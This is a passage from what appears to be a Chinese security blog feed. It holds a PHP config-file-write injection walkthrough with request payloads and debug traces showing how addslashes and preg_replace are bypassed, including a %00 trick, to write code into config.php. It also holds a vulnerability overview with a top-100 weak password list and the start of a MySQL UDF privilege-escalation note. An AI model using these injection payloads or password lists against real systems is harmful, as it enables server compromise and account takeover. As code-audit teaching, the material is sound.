<p>调试过程如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">0.0005     333944   -&gt; &#123;main&#125;() D:\phpstudy\www\index.php:0</div><div class="line">    0.0007     333976     -&gt; addslashes(&apos;aaa\&apos;;phpinfo();\n//&apos;) D:\phpstudy\www\index.php:3</div><div class="line">                           &gt;=&gt; &apos;aaa\\\&apos;;phpinfo();\n//&apos;</div><div class="line">                           =&gt; $str = &apos;aaa\\\&apos;;phpinfo();\n//&apos; D:\phpstudy\www\index.php:3</div><div class="line">    0.0009     334144     -&gt; file_get_contents(&apos;./config.php&apos;) D:\phpstudy\www\index.php:4</div><div class="line">                           &gt;=&gt; &apos;&lt;?php\n$option=\&apos;\&apos;;\n\n&apos;</div><div class="line">                           =&gt; $file = &apos;&lt;?php\n$option=\&apos;\&apos;;\n\n&apos; D:\phpstudy\www\index.php:4</div><div class="line">    0.0012     334552     -&gt; preg_replace(&apos;|\\$option=\&apos;.*\&apos;;|&apos;, &apos;$option=\&apos;aaa\\\&apos;;phpinfo();\n//\&apos;;&apos;, &apos;&lt;?php\n$option=\&apos;\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:5</div><div class="line">                           &gt;=&gt; &apos;&lt;?php\n$option=\&apos;aaa\\\&apos;;phpinfo();\n//\&apos;;\n\n&apos;</div><div class="line">                           =&gt; $file = &apos;&lt;?php\n$option=\&apos;aaa\\\&apos;;phpinfo();\n//\&apos;;\n\n&apos; D:\phpstudy\www\index.php:5</div><div class="line">    0.0014     334488     -&gt; file_put_contents(&apos;./config.php&apos;, &apos;&lt;?php\n$option=\&apos;aaa\\\&apos;;phpinfo();\n//\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:6</div><div class="line">                           &gt;=&gt; 38</div><div class="line">                         &gt;=&gt; 1</div><div class="line">    0.0051 zu</div></pre></td></tr></table></figure></p>
<p><strong>2、第二次传入随意的字符</strong><br>例如bbb正则代码.*会将匹配到的aaa\替换为bbb<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/index.php?option=bbb</div></pre></td></tr></table></figure></p>
<p>调试过程如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">0.0006     333832   -&gt; &#123;main&#125;() D:\phpstudy\www\index.php:0</div><div class="line">0.0008     333864     -&gt; addslashes(&apos;bbb&apos;) D:\phpstudy\www\index.php:3</div><div class="line">                       &gt;=&gt; &apos;bbb&apos;</div><div class="line">                       =&gt; $str = &apos;bbb&apos; D:\phpstudy\www\index.php:3</div><div class="line">0.0011     334016     -&gt; file_get_contents(&apos;./config.php&apos;) D:\phpstudy\www\index.php:4</div><div class="line">                       &gt;=&gt; &apos;&lt;?php\n$option=\&apos;bbb\&apos;;phpinfo();\n//\&apos;;\n\n&apos;</div><div class="line">                       =&gt; $file = &apos;&lt;?php\n$option=\&apos;bbb\&apos;;phpinfo();\n//\&apos;;\n\n&apos; D:\phpstudy\www\index.php:4</div><div class="line">0.0022     334424     -&gt; preg_replace(&apos;|\\$option=\&apos;.*\&apos;;|&apos;, &apos;$option=\&apos;bbb\&apos;;&apos;, &apos;&lt;?php\n$option=\&apos;bbb\&apos;;phpinfo();\n//\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:5</div><div class="line">                       &gt;=&gt; &apos;&lt;?php\n$option=\&apos;bbb\&apos;;phpinfo();\n//\&apos;;\n\n&apos;</div><div class="line">                       =&gt; $file = &apos;&lt;?php\n$option=\&apos;bbb\&apos;;phpinfo();\n//\&apos;;\n\n&apos; D:\phpstudy\www\index.php:5</div><div class="line">0.0024     334400     -&gt; file_put_contents(&apos;./config.php&apos;, &apos;&lt;?php\n$option=\&apos;bbb\&apos;;phpinfo();\n//\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:6</div><div class="line">                       &gt;=&gt; 37</div><div class="line">                     &gt;=&gt; 1</div><div class="line">0.0067 zu</div></pre></td></tr></table></figure></p>
<p>此时config.php内容变为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$option=&apos;bbb&apos;;phpinfo();</div><div class="line">//&apos;;</div></pre></td></tr></table></figure></p>
<h3 id="0x03-利用-00"><a href="#0x03-利用-00" class="headerlink" title="0x03 利用%00"></a>0x03 利用%00</h3><p>仍然分为两步：<br><strong>1、第一次传入;phpinfo();</strong>，即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/index.php?option=;phpinfo();</div></pre></td></tr></table></figure></p>
<p>调试如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">0.0005     333880   -&gt; &#123;main&#125;() D:\phpstudy\www\index.php:0</div><div class="line">  0.0007     333912     -&gt; addslashes(&apos;;phpinfo();&apos;) D:\phpstudy\www\index.php:3</div><div class="line">                         &gt;=&gt; &apos;;phpinfo();&apos;</div><div class="line">                         =&gt; $str = &apos;;phpinfo();&apos; D:\phpstudy\www\index.php:3</div><div class="line">  0.0009     334080     -&gt; file_get_contents(&apos;./config.php&apos;) D:\phpstudy\www\index.php:4</div><div class="line">                         &gt;=&gt; &apos;&lt;?php\n$option=\&apos;;phpinfo();\&apos;;\n\n&apos;</div><div class="line">                         =&gt; $file = &apos;&lt;?php\n$option=\&apos;;phpinfo();\&apos;;\n\n&apos; D:\phpstudy\www\index.php:4</div><div class="line">  0.0012     334488     -&gt; preg_replace(&apos;|\\$option=\&apos;.*\&apos;;|&apos;, &apos;$option=\&apos;;phpinfo();\&apos;;&apos;, &apos;&lt;?php\n$option=\&apos;;phpinfo();\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:5</div><div class="line">                         &gt;=&gt; &apos;&lt;?php\n$option=\&apos;;phpinfo();\&apos;;\n\n&apos;</div><div class="line">                         =&gt; $file = &apos;&lt;?php\n$option=\&apos;;phpinfo();\&apos;;\n\n&apos; D:\phpstudy\www\index.php:5</div><div class="line">  0.0014     334448     -&gt; file_put_contents(&apos;./config.php&apos;, &apos;&lt;?php\n$option=\&apos;;phpinfo();\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:6</div><div class="line">                         &gt;=&gt; 30</div><div class="line">                       &gt;=&gt; 1</div><div class="line">  0.0057 zu</div></pre></td></tr></table></figure></p>
<p>config.php的内容变化：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$option=&apos;;phpinfo();&apos;;</div></pre></td></tr></table></figure></p>
<p><strong>2、第二次传入%00</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/index.php?option=%00</div></pre></td></tr></table></figure></p>
<p>%00被addslashes()转为\0，而\0在preg_replace函数中会被替换为“匹配到的全部内容”<br>此时preg_replace要执行的代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">preg_replace(&apos;|\$option=\&apos;.*\&apos;;|&apos;,&quot;\$option=&apos;\\0&apos;;&quot;,$file);</div></pre></td></tr></table></figure></p>
<p>或<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">preg_replace(&apos;|\$option=\&apos;.*\&apos;;|&apos;,&quot;\$option=&apos;$0&apos;;&quot;,$file);</div></pre></td></tr></table></figure></p>
<p>即执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">preg_replace(&apos;|\$option=\&apos;.*\&apos;;|&apos;,&quot;\$option=&apos;$option=&apos;;phpinfo();&apos;;&apos;;&quot;,$file);</div></pre></td></tr></table></figure></p>
<p>调试过程：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">0.0004     333832   -&gt; &#123;main&#125;() D:\phpstudy\www\index.php:0</div><div class="line">  0.0006     333864     -&gt; addslashes(&apos;\000&apos;) D:\phpstudy\www\index.php:3</div><div class="line">                         &gt;=&gt; &apos;\\0&apos;</div><div class="line">                         =&gt; $str = &apos;\\0&apos; D:\phpstudy\www\index.php:3</div><div class="line">  0.0007     334016     -&gt; file_get_contents(&apos;./config.php&apos;) D:\phpstudy\www\index.php:4</div><div class="line">                         &gt;=&gt; &apos;&lt;?php\n$option=\&apos;$option=\&apos;;phpinfo();\&apos;;\&apos;;\n\n&apos;</div><div class="line">                         =&gt; $file = &apos;&lt;?php\n$option=\&apos;$option=\&apos;;phpinfo();\&apos;;\&apos;;\n\n&apos; D:\phpstudy\www\index.php:4</div><div class="line">  0.0011     334432     -&gt; preg_replace(&apos;|\\$option=\&apos;.*\&apos;;|&apos;, &apos;$option=\&apos;\\0\&apos;;&apos;, &apos;&lt;?php\n$option=\&apos;$option=\&apos;;phpinfo();\&apos;;\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:5</div><div class="line">                         &gt;=&gt; &apos;&lt;?php\n$option=\&apos;$option=\&apos;$option=\&apos;;phpinfo();\&apos;;\&apos;;\&apos;;\n\n&apos;</div><div class="line">                         =&gt; $file = &apos;&lt;?php\n$option=\&apos;$option=\&apos;$option=\&apos;;phpinfo();\&apos;;\&apos;;\&apos;;\n\n&apos; D:\phpstudy\www\index.php:5</div><div class="line">  0.0013     334408     -&gt; file_put_contents(&apos;./config.php&apos;, &apos;&lt;?php\n$option=\&apos;$option=\&apos;$option=\&apos;;phpinfo();\&apos;;\&apos;;\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:6</div><div class="line">                         &gt;=&gt; 52</div><div class="line">                       &gt;=&gt; 1</div><div class="line">  0.0071 zu</div></pre></td></tr></table></figure></p>
<p>config.php的变化：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$option=&apos;\$option=&apos;;phpinfo();&apos;;&apos;;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;p师傅前几天的小密圈的一个问题，这是一个经典的配置文件写入问题漏洞:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;?php&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;if(!isset($_GET[&amp;apos;option&amp;apos;])) die();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$str = addslashes($_GET[&amp;apos;option&amp;apos;]);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$file = file_get_contents(&amp;apos;./config.php&amp;apos;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$file = preg_replace(&amp;apos;|\$option=\&amp;apos;.*\&amp;apos;;|&amp;apos;, &amp;quot;\$option=&amp;apos;$str&amp;apos;;&amp;quot;, $file);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;file_put_contents(&amp;apos;./config.php&amp;apos;, $file);&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;config.php的内容：
    
    </summary>
    
      <category term="代码" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81/"/>
    
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>常见漏洞总结</title>
    <link href="http://yoursite.com/%E6%BC%8F%E6%B4%9E/2017/03/14/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93.html"/>
    <id>http://yoursite.com/漏洞/2017/03/14/常见漏洞总结.html</id>
    <published>2017-03-14T12:00:08.000Z</published>
    <updated>2017-04-02T07:30:36.049Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-安全配置错误"><a href="#0x01-安全配置错误" class="headerlink" title="0x01 安全配置错误"></a>0x01 安全配置错误</h3><h4 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h4><p>   好的安全需要对应用程序、框架、应用程序服务器、web服务器、数据库服务器和平台定义和执行安全配置。由于许多配置的默认值并不是安全的，因此，必须定义、实施和维护这些配置。这包含了对所有的软件保持及时的更新，包括所有应用程序的库文件。<br>   安全配置错误可以发生在一个应用程序堆栈的任何层面，包括平台、Web服务器、应用服务器、数据库、架构和自定义代码。攻击者通过访问默认账户、未使用的网页、未安装补丁的漏洞、未被保护的文件和目录等，以获得对系统未授权的访问。<a id="more"></a></p>
<h4 id="0x02-形成原因"><a href="#0x02-形成原因" class="headerlink" title="0x02 形成原因"></a>0x02 形成原因</h4><p>1、软件没有被及时更新，包括操作系统、web应用服务器、数据库管理系统、应用程序和其他所有的代码库文件<br>2、apache服务器配置为显示目录索引，能够查看目录结构；没有关闭错误显示，可以根据错误提示获取敏感信息；没有删除默认的文件如phpinfo文件等<br>3、nginx服务器使用了autoindex模块、开启服务器标记、没有对IP连接数做限制、文件类型错误解析等等<br>4、开发框架（例如Struts、Spring等）和库文件中的安全设置没有配置恰当</p>
<h4 id="0x03-危害性"><a href="#0x03-危害性" class="headerlink" title="0x03 危害性"></a>0x03 危害性</h4><p>不当的安全配置，攻击者能访问一些未授权的系统数据或功能，会使系统处于高风险中，随时都有可能被攻破，造成不可估量的损失。</p>
<h4 id="0x04-防御方法"><a href="#0x04-防御方法" class="headerlink" title="0x04 防御方法"></a>0x04 防御方法</h4><p>1、自动化安装部署，保证开发、QA、产品环境的配置尽量相同，减少部署一个新安全环境的耗费。<br>2、及时了解并部署每个环境的软件更新和补丁信息，确保所有应用都何如了最新的安全补丁，包括第三方软件或平台，特别是开源软件，需要及时升级和更新安全补丁。<br>3、提供有效分离和安全性强大的应用程序架构。<br>4、实施漏洞扫描和安全审计，以帮助检查错误的配置或者未安装的补丁，推荐使用nessus，AppScan等扫描软件对应用程序和服务器进行安全扫描。<br>5、使用最小权限原则，给用户分配刚好能够满足业务范畴的权限。<br>6、禁止将.old, .bak, .test等测试文件或备份文件随产品发布，禁止将文件上传到Web服务器目录，禁止给上传的文件可执行权限。<br>7、对使用的Web容器，操作系统进行加固，不要使用管理员账户运行应用程序和数据库服务，如禁用Web容器的控制台，不要使用数据库管理严账户运行数据库，配置SSL通道，采用安全的TSL协议版本，配置安全加密套件，合理控制文件权限。<br>8、合理处理应用程序错误，不要将敏感信息随意泄露和展现到客户端，被攻击者利用从而轻易攻破系统。</p>
<h3 id="0x02-业务逻辑"><a href="#0x02-业务逻辑" class="headerlink" title="0x02 业务逻辑"></a>0x02 业务逻辑</h3><h4 id="0x01-漏洞描述-1"><a href="#0x01-漏洞描述-1" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h4><p>业务逻辑问题是一种设计缺陷。逻辑缺陷表现为设计者或开发者在思考过程中做出的特殊假设存在明显或隐含的错误。<br>精明的攻击者会特别注意目标应用程序采用的逻辑方式，设法了解设计者与开发者做出的可能假设，然后考虑如何攻破这些假设。<br>黑客挖掘逻辑漏洞有两个重点，就是业务流程和HTTP/HTTPS请求篡改。</p>
<h4 id="0x02-逻辑错误分类"><a href="#0x02-逻辑错误分类" class="headerlink" title="0x02 逻辑错误分类"></a>0x02 逻辑错误分类</h4><p>1.欺骗密码找回功能<br>程序根据一个验证码来确定是用户本人，但是攻击者可以暴力破解验证码。<br>2.规避交易限制<br>攻击者篡改数据报，使得购买的商品为负数，或者商品价格为负数。<br>3.越权缺陷<br>攻击者更改数据包中指示用户的id，来访问他人敏感信息或者冒充他人发布信息。<br>4.cookies和session的问题<br>攻击者在知道用户ID的前提下，然后构造一个cookies或让session值为true就可以绕过这样的认证。<br>5.顺序执行缺陷（强制浏览）<br>攻击者在网购的过程中绕过支付过程，直接从放入购物车步骤进入填写收货地址的步骤，这样的话就可以0元购物了。</p>
<h4 id="0x03-利用方法"><a href="#0x03-利用方法" class="headerlink" title="0x03 利用方法"></a>0x03 利用方法</h4><p>1、业务逻辑数据验证测试 (OTG-BUSLOGIC-001)<br>在业务逻辑数据验证测试中，我们验证应用程序不允许用户向系统/应用程序插入“未验证”的数据。这是非常重要的，因为如果没有这层防护措施，攻击者可能向应用程序/系统插入“未验证”的数据/信息，而且使系统认为这些数据是“好的”并且已经在“入口”点进行验证，并且让系统相信“入口”点已经实施过了数据验证，因为这是业务逻辑工作流的一环。<br>2、请求伪造能力测试 (OTG-BUSLOGIC-002)<br>在伪造和参数预测测试中，我们验证应用程序不允许用户向系统任何不应该有权限访问的或者需要特定时间特定方法访问的组件中提交或改变数据。这非常重要，因为缺少这层防护措施，攻击者可能通过“愚弄/忽悠”应用系统允许他们进入本不能进入的区域，绕过了应用业务逻辑工作流。<br>3、完整性测试 (OTG-BUSLOGIC-003)<br>在完整性检查和篡改证据测试中，我们验证应用程序不允许用户破坏系统任何部分或数据的完整性。这非常重要，因为缺少这层防护措施，攻击者能打破业务逻辑工作流，并改变已经被攻破的应用/系统数据或者通过改变日志文件中的信息掩盖某种行为。<br>4、过程时长测试 (OTG-BUSLOGIC-004)<br>在过程时长测试中，我们验证应用程序不允许用户通过输入/输出时长来操作系统或者预测系统行为。这非常重要，因为缺少这层防护，攻击者可能能监视处理时间和确定基于时间的输出内容或通过时间差异不完成某事务或某动作来绕过应用程序业务逻辑。<br>5、功能使用次数限制测试 (OTG-BUSLOGIC-005)<br>在功能限制测试中，我们验证应用程序不允许用户使用超出应用程序的份额或业务工作流需要的功能次数。这非常重要，因为缺少这层防护，攻击者可能能超出业务使用次数许可地使用应用程序功能或者份额来获取额外的利益。<br>6、工作流程绕过测试 (OTG-BUSLOGIC-006)<br>在绕过工作流的测试中，我们验证应用系统不允许用户实施在业务处理流程“支持/需要”之外的动作。这非常重要，因为缺少这层防护，攻击者可能能绕过工作流和某些检查，允许他们提前进入或跳过某些必须的区域。应用系统潜在允许动作/事务在不完成完整的业务流程下完成，使整个系统处在不完整的信息追踪回溯的环境中。<br>7、应用误用防护测试 (OTG-BUSLOGIC-007)<br>在应用程序误用测试中，我们验证系统不允许用户以不预期的方式使用应用程序。<br>8、非预期文件类型上传测试 (OTG-BUSLOGIC-008)<br>在非预期文件上传测试中，我们验证应用程序不允许用户上传系统期待或业务逻辑允许以外的文件类型的文件。这非常重要因为缺少这层防护，攻击者可能提交非预期的文件如.exe或.php，这些文件可能被保存在系统之中，并被系统或应用程序执行。<br>9、恶意文件上传测试 (OTG-BUSLOGIC-009)<br>在恶意文件上传测试中，我们验证应用系统不允许用户向系统上传能破坏系统安全的恶意或潜在恶意文件。这非常重要因为缺少这层防护措施，攻击者就能够向系统上传恶意文件来传播病毒、恶意软件甚至利用程序如执行shellcode。</p>
<h3 id="0x03-弱口令"><a href="#0x03-弱口令" class="headerlink" title="0x03 弱口令"></a>0x03 弱口令</h3><h4 id="0x01-漏洞描述-2"><a href="#0x01-漏洞描述-2" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h4><p>   通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。<br>    常见弱口令有：<br>    1、数字或字母连排或混排，键盘字母连排（如：123456，abcdef，123abc，qwerty，1qaz2wsx等）；<br>    2、生日，姓名+生日（利用社工非常容易被破解）；<br>    3、短语密码（如：5201314，woaini1314等）。</p>
<h4 id="0x02-形成原因-1"><a href="#0x02-形成原因-1" class="headerlink" title="0x02 形成原因"></a>0x02 形成原因</h4><p>   这个应该是与个人习惯相关与意识相关，为了避免忘记密码，使用一个非常容易记住的密码，或者是直接采用系统的默认密码等。<br>相关的安全意识不够，总认为不会有人会猜到我这个弱口令的。</p>
<h4 id="0x03-危害性-1"><a href="#0x03-危害性-1" class="headerlink" title="0x03 危害性"></a>0x03 危害性</h4><p>   在当今很多地方以用户名(帐号)和口令作为鉴权的世界，口令的重要性就可想而知了。口令就相当于进入家门的钥匙，当他人有一把可以进入你家的钥匙，想想你的安全、你的财物、你的隐私。因为弱口令很容易被他人猜到或破解，所以如果你使用弱口令，就像把家门钥匙放在家门口的垫子下面，是非常危险的。</p>
<h4 id="0x04-防御方法-1"><a href="#0x04-防御方法-1" class="headerlink" title="0x04 防御方法"></a>0x04 防御方法</h4><p>设置密码通常遵循以下原则：<br>（1）不使用空口令或系统缺省的口令，这些口令众所周之，为典型的弱口令。<br>（2）口令长度不小于8 个字符。<br>（3）口令不应该为连续的某个字符（例如：AAAAAAAA）或重复某些字符的组合（例如：tzf.tzf.）。<br>（4）口令应该为以下四类字符的组合，大写字母(A-Z)、小写字母(a-z)、数字(0-9)和特殊字符。每类字符至少包含一个。如果某类字符只包含一个，那么该字符不应为首字符或尾字符。<br>（5）口令中不应包含本人、父母、子女和配偶的姓名和出生日期、纪念日期、登录名、E-mail 地址等等与本人有关的信息，以及字典中的单词。<br>（6）口令不应该为用数字或符号代替某些字母的单词。<br>（7）口令应该易记且可以快速输入，防止他人从你身后很容易看到你的输入。<br>（8）至少90 天内更换一次口令，防止未被发现的入侵者继续使用该口令。</p>
<p><strong>附：弱口令top100</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div></pre></td><td class="code"><pre><div class="line">123456789</div><div class="line">a123456</div><div class="line">123456</div><div class="line">a123456789</div><div class="line">1234567890</div><div class="line">woaini1314</div><div class="line">qq123456</div><div class="line">abc123456</div><div class="line">123456a</div><div class="line">123456789a</div><div class="line">147258369</div><div class="line">zxcvbnm</div><div class="line">987654321</div><div class="line">12345678910</div><div class="line">abc123</div><div class="line">qq123456789</div><div class="line">123456789.</div><div class="line">7708801314520</div><div class="line">woaini</div><div class="line">5201314520</div><div class="line">q123456</div><div class="line">123456abc</div><div class="line">1233211234567</div><div class="line">123123123</div><div class="line">123456.</div><div class="line">0123456789</div><div class="line">asd123456</div><div class="line">aa123456</div><div class="line">135792468</div><div class="line">q123456789</div><div class="line">abcd123456</div><div class="line">12345678900</div><div class="line">woaini520</div><div class="line">woaini123</div><div class="line">zxcvbnm123</div><div class="line">1111111111111111</div><div class="line">w123456</div><div class="line">aini1314</div><div class="line">abc123456789</div><div class="line">111111</div><div class="line">woaini521</div><div class="line">qwertyuiop</div><div class="line">1314520520</div><div class="line">1234567891</div><div class="line">qwe123456</div><div class="line">asd123</div><div class="line">000000</div><div class="line">1472583690</div><div class="line">1357924680</div><div class="line">789456123</div><div class="line">123456789abc</div><div class="line">z123456</div><div class="line">1234567899</div><div class="line">aaa123456</div><div class="line">abcd1234</div><div class="line">www123456</div><div class="line">123456789q</div><div class="line">123abc</div><div class="line">qwe123</div><div class="line">w123456789</div><div class="line">7894561230</div><div class="line">123456qq</div><div class="line">zxc123456</div><div class="line">123456789qq</div><div class="line">1111111111</div><div class="line">111111111</div><div class="line">0000000000000000</div><div class="line">1234567891234567</div><div class="line">qazwsxedc</div><div class="line">qwerty</div><div class="line">123456..</div><div class="line">zxc123</div><div class="line">asdfghjkl</div><div class="line">0000000000</div><div class="line">1234554321</div><div class="line">123456q</div><div class="line">123456aa</div><div class="line">9876543210</div><div class="line">110120119</div><div class="line">qaz123456</div><div class="line">qq5201314</div><div class="line">123698745</div><div class="line">5201314</div><div class="line">000000000</div><div class="line">as123456</div><div class="line">123123</div><div class="line">5841314520</div><div class="line">z123456789</div><div class="line">52013145201314</div><div class="line">a123123</div><div class="line">caonima</div><div class="line">a5201314</div><div class="line">wang123456</div><div class="line">abcd123</div><div class="line">123456789..</div><div class="line">woaini1314520</div><div class="line">123456asd</div><div class="line">aa123456789</div><div class="line">741852963</div><div class="line">a12345678</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-安全配置错误&quot;&gt;&lt;a href=&quot;#0x01-安全配置错误&quot; class=&quot;headerlink&quot; title=&quot;0x01 安全配置错误&quot;&gt;&lt;/a&gt;0x01 安全配置错误&lt;/h3&gt;&lt;h4 id=&quot;0x01-漏洞描述&quot;&gt;&lt;a href=&quot;#0x01-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞描述&quot;&gt;&lt;/a&gt;0x01 漏洞描述&lt;/h4&gt;&lt;p&gt;   好的安全需要对应用程序、框架、应用程序服务器、web服务器、数据库服务器和平台定义和执行安全配置。由于许多配置的默认值并不是安全的，因此，必须定义、实施和维护这些配置。这包含了对所有的软件保持及时的更新，包括所有应用程序的库文件。&lt;br&gt;   安全配置错误可以发生在一个应用程序堆栈的任何层面，包括平台、Web服务器、应用服务器、数据库、架构和自定义代码。攻击者通过访问默认账户、未使用的网页、未安装补丁的漏洞、未被保护的文件和目录等，以获得对系统未授权的访问。
    
    </summary>
    
      <category term="漏洞" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>提权思路</title>
    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F/2017/03/07/%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF.html"/>
    <id>http://yoursite.com/渗透/2017/03/07/提权思路.html</id>
    <published>2017-03-07T14:52:04.000Z</published>
    <updated>2017-04-02T07:30:02.862Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-mysql提权"><a href="#0x01-mysql提权" class="headerlink" title="0x01 mysql提权"></a>0x01 mysql提权</h3><h4 id="0x01-UDF提权"><a href="#0x01-UDF提权" class="headerlink" title="0x01 UDF提权"></a>0x01 UDF提权</h4><p>1、利用UDF提权<br>udf提权这是最常见的提权方式，也就是User defined Function,用户定义函数。是一类对MYSQL服务器功能进行扩充的代码，通常是用C（或C++）写的。通过添加新函数，性质就象使用本地MYSQL函数abs()或concat()。当你需要扩展MYSQL服务器功能时，UDF通常是最好的选择。但同时，UDF也是黑客们在拥有低权限mysql账号时比较好用的一种提权方法。<a id="more"></a></p>
